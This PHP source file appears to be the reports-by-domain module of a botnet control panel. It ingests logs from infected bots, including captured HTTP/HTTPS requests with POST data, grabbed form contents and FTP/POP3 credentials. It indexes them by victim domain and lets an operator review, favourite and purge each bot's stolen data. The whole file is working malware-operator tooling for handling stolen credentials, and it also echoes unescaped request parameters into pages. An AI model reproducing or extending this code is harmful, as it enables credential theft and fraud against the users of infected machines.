<?php if(!defined('__CP__'))die();
require_once 'system/lib/db.php';
require_once 'system/lib/guiutil.php';

define('URLTYPE_UNKNOWN', 0);
define('URLTYPE_HTTP', 1);
define('URLTYPE_HTTPS', 2);

if (isset($_GET['ajax'])){
	set_time_limit(60*60);
	ignore_user_abort(true);
	switch ($_GET['ajax']){
		case 'mark-all-checked': # Mark all logs as checked
			mysql_query('UPDATE `botnet_rep_domainlogs` SET `checked`=1;');
			echo mysql_affected_rows(), LNG_MARKED_REPORTS;
			break;
		case 'mark-fav-checked': # Mark all logs on favorite domains as checked
			mysql_query('UPDATE `botnet_rep_domains` `d` CROSS JOIN `botnet_rep_domainlogs` `r` ON(`d`.`id` = `r`.`domain_id`) SET `r`.`checked`=1 WHERE `d`.`favorite`=1;');
			echo mysql_affected_rows(), LNG_MARKED_REPORTS;
			break;
		case 'count-new-reports': # Count the reports not yet parsed
			print count_new_reports();
			break;
		case 'parse-more-reports': # Parse some yummy reports
			$time_start = microtime(true);
			# Determine the time of last log parsed
			list($minrtime,$maxrtime) = get_rtime_interval();
			# Get the list of date-tables to parse
			$tables = array();
			foreach (list_reports_tables() as $timestamp => $yymmdd )
				$tables[$timestamp] = "botnet_reports_$yymmdd";
			# Disable indexes on performance
			mysql_query('ALTER TABLE `botnet_rep_domainlogs` DISABLE KEYS;');
			# Parse those tables
			$report_types = implode(',', array(
				// path_source , context
				BLT_HTTP_REQUEST, BLT_HTTPS_REQUEST, 
				BLT_LOGIN_FTP, BLT_LOGIN_POP3,  // <empty>, protocol://user:pass@host:port/
				BLT_GRABBED_HTTP, // URL, <grabbed matches>
				));
			$domains = array(); # Domains cache from `botnet_rep_domains`: domain => id
			$reports_batch = array(); # Reports batching
			$domains_new = 0; # New domains count
			$reports_new = 0; # New reports count
			$rtime_max = 0; # The most recent parsed rtime
			foreach ($tables as $timestamp => $table){
				$R_reports = mysql_query("SELECT `id`, `bot_id`, `path_source`, `type`, `rtime`  FROM `$table` WHERE `rtime`>=$maxrtime AND `type` IN($report_types) ORDER BY `id` ASC;");
				while ($R_reports && !is_bool($r = mysql_fetch_assoc($R_reports))){
					$fdomain = null;
					$urltype = URLTYPE_UNKNOWN;
					# Parse the domain out
					switch ($r['type']){
						# `path_source` = URL, `context` = <Headers & Post>
						case BLT_HTTP_REQUEST:
						case BLT_HTTPS_REQUEST:
						# `path_source` = URL, `context` = <matched&grabbed data>
						case BLT_GRABBED_HTTP:
							$purl = parse_url($r['path_source']);
							if (is_array($purl) && isset($purl['host'])){
								$fdomain = $purl['host'];
								switch (strtolower($purl['scheme'])){
									case 'https':	$urltype = URLTYPE_HTTPS;	break;
									case 'http':	$urltype = URLTYPE_HTTP;		break;
									default:		$urltype = URLTYPE_UNKNOWN;
									}
								}
							break;
						# `path_source` = -, `context` = protocol://user:pass@host:port/
						#case BLT_LOGIN_FTP:
						#case BLT_LOGIN_POP3:
						#	break; # No need to parse
						}
					
					# Success?
					if (is_null($fdomain))
						continue;
					
					# Strip-out 'www'
					if (strncasecmp($fdomain, 'www.', 4) === 0)
						$fdomain = substr($fdomain, 4);
					$fdomain = trim($fdomain);
					
					# Split-out the 2level & 3level domain name
					$domain2 = null;
					$domain3 = null;
					preg_match('~(^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$)|(?:^|\.)((?:[^\.]+\.)?([^\.]+\.[^\.]+\.?$))~iS', $fdomain, $m);
						
					if (!empty($m[1])) # IP: [1] => IP
						$domain2 = $domain3 = '0.0.0.0';
						elseif (isset($m[2], $m[3])) { # Domain: [2] => 'ad4.liverail.com', [3] => 'liverail.com',
						$domain2 = $m[3];
						$domain3 = $m[2];
						} else { # A very strange domain that does not match
						$domain2 = $domain3 = $fdomain;
						}
					
					# Try to search whether the domain already exists
					if (!isset($domains[$domain3])){
						$R = mysql_query('SELECT `id` FROM `botnet_rep_domains` WHERE `domain3`="'.addslashes($domain3).'";');
						if ($R && mysql_num_rows($R))
							$domains[$domain3] = array_shift(mysql_fetch_row($R));
						}
					# Add the domain if a new one was found
					if (!isset($domains[$domain3])){
						$domains_new++;
						mysql_query(sprintf(
							'INSERT INTO `botnet_rep_domains` VALUES(NULL, "%s", "%s", "%s", 0, 0, 0);',
							addslashes($domain2), # domain
							addslashes($domain2), # domain2
							addslashes($domain3) # domain3
							));
						$domains[$domain3] = mysql_insert_id();
						}
					
					# Remember the last rtime
					$rtime_max = $r['rtime'];
					
					# Add a link to the found report
							/* Benchmarks:
							 * Insert every row:		1676 rep/sec
							 * Insert DELAYED every row:	2303 sep/sec
							 * Batch 100:				2049 rep/sec
							 * Batch 1000:				2281 rep/sec
							 * Batch 100 DELAYED:		2537 rep/sec
							 * Batch 1000 DELAYED:		less, no need
							 * 
							 * Excluded full-domain text:	4746 rep/sec
							 * Table-name is int:		5900 rep/sec
							 */
					$reports_new++;
					$reports_batch[] = sprintf(
							'(%d, %d, %d, %d, %d, "%s", 0)',
							$domains[$domain3], # domain_id
							$timestamp, $r['id'], # table, report_id
							$r['rtime'],
							$urltype,
							addslashes($r['bot_id'])
							);
					if (count($reports_batch) > 100){
						mysql_query('INSERT DELAYED INTO `botnet_rep_domainlogs` VALUES '.implode(',', $reports_batch).';');
						$reports_batch = array();
						}
					
					# Time limit
					if ( (time() - $time_start) > 60 ){
						echo LNG_PARSED_INTERRUPT.'<br>';
						break;
						}
					}
				}
			
			# Add last rows
			if (count($reports_batch))
				mysql_query('INSERT DELAYED INTO `botnet_rep_domainlogs` VALUES '.implode(',', $reports_batch).';');
			
			# Update `mtime` of the modified domains
			$domain_ids = array_values($domains);
			for ($i=0, $iN = count($domain_ids), $step=127; $i<$iN; $i += $step){
				$ids = array_slice($domain_ids, $i, $step);
				mysql_query('UPDATE `botnet_rep_domains` SET `mtime`='.$rtime_max.' WHERE `id` IN('.implode(',', $ids).');');
				}
			
			# Update the modified domains
			$time_end = microtime(true);
			$speed = round($reports_new / ($time_end - $time_start));
			$time_took = round($time_end - $time_start,1);
			$stat = "<small>($time_took sec, ~$speed reports/sec)</small>";
			echo 
				LNG_PARSED_NEW_DOMAINS, ' ', $domains_new, ' , ', 
				LNG_PARSED_NEW_REPORTS, ' ', $reports_new, ' ',
				$stat;
			
			# Re-enable keys
			mysql_query('ALTER TABLE `botnet_rep_domainlogs` ENABLE KEYS;');
			
			# Remove old reports
			mysql_query('DELETE FROM `botnet_rep_domainlogs` WHERE `checked`=1 AND `rtime` <'.(  time()-60*60*24*3  ).' ;');
			break;
		case 'expander': # Expand/Collapse domains
			# First, fetch the row asked to be expanded/collapsed
			$id = (int)$_GET['id'];
			$r = mysql_fetch_assoc(mysql_query("SELECT `domain`, `domain2`, `expanded` FROM `botnet_rep_domains` WHERE `id`=$id;"));
			if ($r['expanded'] == 0) # Expand
				mysql_query('UPDATE `botnet_rep_domains` SET `domain`=`domain3`, `expanded`=1 WHERE `domain`="'.addslashes($r['domain']).'";');
				else # Collapse
				mysql_query('UPDATE `botnet_rep_domains` SET `domain`=`domain2`, `expanded`=0 WHERE `domain2`="'.addslashes($r['domain2']).'";');
			break;
		case 'fav': # Un/Mark the domain as favorite
			$domain = addslashes($_GET['domain']);
			mysql_query("UPDATE `botnet_rep_domains` SET `favorite`=IF(`favorite`=0,1,0) WHERE `domain`='$domain';");
			break;
		case 'junk': # Un/Mark the domain as junk
			$domain = addslashes($_GET['domain']);
			mysql_query("UPDATE `botnet_rep_domains` SET `favorite`=IF(`favorite`=0,-1,0) WHERE `domain`='$domain';");
			break;
		case 'logs': # Display logs for a domain
			$reports_join = array();
			$reports_coalesce_context = array();
			foreach(list_reports_tables() as $timestamp => $yymmdd){
				$reports_join[] = "`botnet_reports_$yymmdd` AS `r$yymmdd` ON(`r`.`table`='$timestamp' AND `r`.`report_id` = `r$yymmdd`.`id`)";
				$reports_coalesce_context[] = "`r$yymmdd`.`context`";
				}
			$reports_join = implode('LEFT JOIN', $reports_join);
			$reports_coalesce_context = implode(',', $reports_coalesce_context);
			
			list($from, $where, $rtimes) = filter_select();
			$where[] = '`d`.`domain` = "'.addslashes($_GET['domain']).'"';
			$where[] = '`r`.`botId` > "'.mysql_escape_string(empty($_GET['botId'])? '' : $_GET['botId']).'"';
			
			$where = implode(' AND ', $where);
			$query = <<<SQL
				SELECT 
					`r`.`table`,
					`r`.`report_id`,
					`r`.`botId`,
					COALESCE($reports_coalesce_context) AS `context`
				FROM ($from) LEFT JOIN $reports_join
				WHERE $where 
				ORDER BY 
					`r`.`botId` ASC,
					`r`.`report_id` ASC
				;
SQL;
			$onebyone = empty($_GET['show_checked']); # display logs one by one?
			
			$R = mysql_query($query);
			$cur_botId = null;
			echo '<div class="bot_logs" data-onebyone="', (int)$onebyone ,'">';
			while ($R && !is_bool($r = mysql_fetch_assoc($R))){
				if ($r['botId'] != $cur_botId){
					if (!is_null($cur_botId)){
						echo '</table>';
						if ($onebyone)
							break;
						} 
						else echo '<h1>', $_GET['domain'] ,'</h1>';
					echo '<table><caption>', '<a href="?botsaction=fullinfoss&bots[]=', $r['botId'], '" target="_blank">', $r['botId'] , '</a>', '</caption>';
					echo '<TBODY>';
					$cur_botId = $r['botId'];
					}
				echo '<tr><td>', nl2br($r['context']) ,'</td></tr>';
				}
			
			if ($onebyone && !is_null($cur_botId))
				echo '</table><a href="#" id="load-next-bot" data-prev-botid="', urlencode($cur_botId), '">NEXT BOT</a>';
			echo '</div>';
			
			# Mark viewed reports as 'checked'
			if (!empty($_GET['autocheck'])){
				if (!$onebyone) # All logs were shown. Update them all.
					mysql_query("UPDATE $from SET `r`.`checked`=1 WHERE $where;");
					else # Only new logs were shown, one by one. Only update the current bot
					mysql_query("UPDATE $from SET `r`.`checked`=1 WHERE $where AND `r`.`botId`='".addslashes($cur_botId)."';");
				}
			break;
		default:
			var_export($_GET);
			break;
		}
	die();
	}

$do_search = (count($_GET) > 1);

# Read the list of favorite bots
$favorite_bots = array();
$fb_R = mysql_query('SELECT bot_id, comment FROM `botnet_list` WHERE `comment`<>"";');
while (!is_bool($fb_r = mysql_fetch_row($fb_R)))
	$favorite_bots[  $fb_r[0]  ] = $fb_r[1];

# Defaults
if (!isset($_GET['urltype'])) $_GET['urltype'] = '*';
if (!isset($_GET['show_checked'])) $_GET['show_checked'] = 0;
if (!isset($_GET['show_junk'])) $_GET['show_junk'] = 0;
if (!isset($_GET['autocheck'])) $_GET['autocheck'] = 1;

if (!isset($_GET['date0'])) $_GET['date0'] = date('ymd');
if (!isset($_GET['date1'])) $_GET['date1'] = date('ymd');

# Read the list of botnet_reports_* tables
list($minrtime,$maxrtime) = get_parsed_tables_interval();
$dates = list_reports_tables();
$date_select_options = array(  0 => '', 1 => '' );
foreach ($dates as $timestamp => $yymmdd)
	if ($timestamp >= $minrtime){
		$date_select_options[0] .= sprintf('<option value="%s" %s>%s</option>', $yymmdd, $yymmdd==$_GET['date0']?'selected':'' , $yymmdd);
		$date_select_options[1] .= sprintf('<option value="%s" %s>%s</option>', $yymmdd, $yymmdd==$_GET['date1']?'selected':'' , $yymmdd);
	}

ThemeBegin(LNG_REPORTS, 0, getBotJsMenu('botmenu'), 0);
echo
str_replace('{WIDTH}', '100%', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS.THEME_STRING_SPACE), THEME_DIALOG_TITLE);

echo <<<HTML
<link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
<script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
<script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>
<script src="theme/js/domains-list.js"></script>
HTML;

# Parse-more-button
echo '<tr><th><span id="ajax-buttons" align="center">';
if (!$do_search){
	$new_reports_count = count_new_reports();
	echo '<input type="button" value="'.LNG_PARSE_NEW_REPORTS.' (', $new_reports_count, ')" data-href="?m=reports_domains&ajax=parse-more-reports" class="display-new-reports" data-reports="', ($new_reports_count+1) ,'" />';
	} else
	echo LNG_MARK_CHECKED,
		'<input type="button" value="'.LNG_MARK_CHECKED_ALL.'" data-href="?m=reports_domains&ajax=mark-all-checked" />',
		'<input type="button" value="'.LNG_MARK_CHECKED_FAVORITE.'" data-href="?m=reports_domains&ajax=mark-fav-checked" />';
echo '</span>';
echo '</td></tr>';

# Form
echo '<tr><td>';
echo '<form method=GET><input type="hidden" name="m" value="'.$_GET['m'].'" />';
echo '<table>';
echo '	<tr><th>'.LNG_FORM_DATE.'</th>';
echo '			<td>';
echo '			<select name="date0" style="width: 140px;">'.$date_select_options[0].'</select> — ';
echo '			<select name="date1" style="width: 140px;">'.$date_select_options[1].'</select>';
echo '			</td></tr>';
echo '	<tr><th>'.LNG_FORM_URLTYPE.'</th>';
echo '			<td>';
echo '			<select name="urltype" style="width: 300px;">';
echo '				<option value="*">*</option>';
echo '				<option value="'.URLTYPE_HTTP .'" '.($_GET['urltype']==URLTYPE_HTTP?'selected':'').'>http</option>';
echo '				<option value="'.URLTYPE_HTTPS.'" '.($_GET['urltype']==URLTYPE_HTTPS?'selected':'').'>https</option>';
echo '				</select>';
echo '			</td></tr>';
echo '	<tr><td></td><td><input type="hidden" name="show_checked" value="0" /><label><input type="checkbox" name="show_checked" value="1" '.($_GET['show_checked']?'checked':'').'/> '.LNG_FORM_SHOW_CHECKED.'</label></th>';
echo '	<tr><td></td><td><input type="hidden" name="show_junk" value="0" /><label><input type="checkbox" name="show_junk" value="1" '.($_GET['show_junk']?'checked':'').'/> '.LNG_FORM_SHOW_JUNK.'</label></th>';
echo '	<tr><td></td><td><input type="hidden" name="autocheck" value="0" /><label><input type="checkbox" name="autocheck" value="1" '.($_GET['autocheck']?'checked':'').'/> '.LNG_FORM_AUTOCHECK.'</label></th>';
echo '	</table>';
echo '<input type="submit" value="Search" />';
echo '</form>';
echo '</td></tr>';

echo '<tr><td>';
if ($do_search)
	filter_domains();

echo '</td></tr>', THEME_DIALOG_END, ThemeEnd();

function filter_select(){
	$dates = list_reports_tables();
	$rtimes = array(
		array_search($_GET['date0'], $dates) - 1,
		array_search($_GET['date1'], $dates) + 60*60*25
		);
	
	$from = '`botnet_rep_domains` `d` CROSS JOIN `botnet_rep_domainlogs` `r` ON(`d`.`id` = `r`.`domain_id`)';
	$where = array(
		"`r`.`table` >= {$rtimes[0]} AND `r`.`table` <= {$rtimes[1]}", # The selected period
		"`d`.`mtime` >= {$rtimes[0]}", # Exclude domains updated not that often
		);
	if (empty($_GET['show_checked'])) # default: only unchecked reports
		$where[] = "`r`.`checked`=0";
	if (empty($_GET['show_junk'])) # hide junk
		$where[] = "`d`.`favorite`>=0";
	if ($_GET['urltype'] != '*')
		$where[] = "`r`.`urltype` = ".(int)$_GET['urltype'];
	
	return array($from, $where, $rtimes);
	}

function filter_domains(){
	require_once 'system/lib/db-gui.php';
	$CLICKSORT = new Clicksort(false);
	$CLICKSORT->addField('domain', '+', '`d`.`domain`');
	$CLICKSORT->addField('reports', '-', '`reports`');
	$CLICKSORT->config(empty($_GET['sort'])? '' : $_GET['sort'], 'domain+');
	$CLICKSORT->render_url('?'.mkuri(0, 'sort').'&sort=');

	list($from, $where, $rtimes) = filter_select();
	$where = implode(' AND ', $where);
	$query = <<<SQL
		SELECT 
			`d`.`id`,
			`d`.`domain`,
			MAX(`d`.`favorite`) AS `favorite`,
			COUNT(*) as `reports`
		FROM $from 
		WHERE $where 
		GROUP BY `d`.`domain` 
		ORDER BY 
			`d`.`favorite` DESC,
			{$CLICKSORT->orderBy()}
		;
SQL;
	$R = mysql_query($query);
	echo '<div align=center>', LNG_HINT_RMOUSE, '</div>';
	print '<table id="domains-list">';
	echo '<THEAD><tr>',
		'<th>', $CLICKSORT->field_render('domain', LNG_DOMAINLIST_DOMAIN), '</th>',
		'<th>', $CLICKSORT->field_render('reports', LNG_DOMAINLIST_REPORTS), '</th>',
		'</tr></THEAD>';
	print '<TBODY>';
	while ($R and !is_bool($r = mysql_fetch_assoc($R))){
		$rowclass = '';
		if ($r['favorite'] != 0)
			$rowclass = $r['favorite']>0? "fav" : "junk";
		echo '<tr class="', $rowclass, '" data-href="&id=', $r['id'], '&domain=', urlencode($r['domain']), '">';
		echo '<th>', '<a href="#">', $r['domain'], '</a>', '</th>';
		echo '<td>', $r['reports'], '</td>';
		echo '</tr>';
		}
	print '</TBODY>';
	print '</table>';
	}


function get_rtime_interval(){
	$default = mktime(0,0,0,date('m'),date('d'),date('y'))-60*60*36;
	return mysql_fetch_row(
			mysql_query(
				"SELECT COALESCE(MIN(`rtime`),$default), COALESCE(MAX(`rtime`),$default) FROM `botnet_rep_domainlogs`;"
			));
	}
function get_parsed_tables_interval(){
	$default = mktime(0,0,0,date('m'),date('d'),date('y'));
	return mysql_fetch_row(mysql_query(
		"SELECT COALESCE(MIN(`table`),$default), COALESCE(MAX(`table`),$default) FROM `botnet_rep_domainlogs`;"
		));
	}

function count_new_reports(){
	list($minrtime, $maxrtime) = get_rtime_interval();
	$unparsed = 0;
		foreach (list_reports_tables() as $yymmdd )
			$unparsed += array_shift(
				mysql_fetch_row(
					mysql_query(
						"SELECT COUNT(*) FROM `botnet_reports_$yymmdd` WHERE `rtime`>$maxrtime;"
				)));
	return $unparsed;
	}
